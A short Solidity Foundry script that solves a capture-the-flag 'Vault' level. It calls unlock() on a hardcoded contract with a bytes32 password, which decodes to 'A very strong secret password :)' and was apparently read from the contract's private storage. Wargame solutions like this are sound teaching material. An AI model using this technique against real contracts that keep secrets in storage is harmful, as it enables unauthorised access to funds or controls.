// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";

contract Level7VaultSolution is Script {
    Vault public instance = Vault(0xd30290FAb5e363541833539A5A3959A170F063df);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        instance.unlock(bytes32(0x412076657279207374726f6e67207365637265742070617373776f7264203a29));
        vm.stopBroadcast();
    }
}
